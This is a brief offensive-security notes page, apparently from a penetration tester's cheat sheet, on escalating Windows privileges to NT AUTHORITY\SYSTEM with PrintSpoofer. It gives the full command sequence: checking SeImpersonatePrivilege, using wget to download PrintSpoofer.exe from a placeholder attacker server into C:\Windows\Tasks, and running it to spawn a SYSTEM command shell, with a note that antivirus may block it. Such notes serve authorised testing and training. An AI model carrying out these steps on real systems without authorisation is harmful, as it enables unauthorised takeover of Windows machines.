# <h1 align="center" id="heading">PrintSpoofer</h1>
PrintSpoofer is a quick and easy way to elevate privileges within a target system. In order for this attack to be possible, the SeImpersonatePrivilege must be enabled. This is commonly available for service accounts including (but not limited to) IIS SERVICE, LOCAL SERVICE, and NETWORK SERVICE. If I find myself on a system in one of these contexts, I can quickly and easily elevate privileges to NT AUTHORITY\SYSTEM. I will need to first run the following command to check if SeImpersonatePrivilege is available on the target:
```console
whoami /priv
```
If it shows enabled, I can run the following command to transfer the executable to the target system:
```powershell
wget http://<attacker server>/PrintSpoofer.exe -outfile C:\Windows\Tasks\PrintSpoofer.exe
```
Next, I will run the following command to trigger the privilege escalation on the target system:
```console
C:\Windows\Tasks\PrintSpoofer.exe -i -c cmd
```
If this attack is successful and not blocked by AV, I will recieve a SYSTEM session on the target.
